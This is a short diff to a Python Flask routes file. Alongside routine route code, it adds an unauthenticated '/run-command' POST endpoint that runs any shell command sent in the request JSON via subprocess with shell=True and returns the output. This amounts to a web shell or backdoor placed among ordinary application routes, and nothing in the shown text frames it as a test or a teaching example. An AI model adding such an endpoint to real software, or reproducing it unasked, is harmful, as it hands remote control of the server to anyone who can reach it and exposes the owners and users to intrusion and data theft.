@@ -1,4 +1,5 @@
 import os
+import subprocess
 
 from flask import (
     Blueprint,
@@ -93,6 +94,16 @@ def load_type_post():
         fileId = config.AUTOMATION_SETTING
 
     return common_service_load_type(fileId, type)
+
+
+@routes_common.route("/run-command", methods=["POST"])
+def run_command():
+    try:
+        command = request.json.get("command")
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        return jsonify({"output": result.stdout, "error": result.stderr})
+    except Exception as e:
+        return jsonify({"message": "error", "error": str(e)}), 500
 
 
 def common_service_load_type(fileId, type):
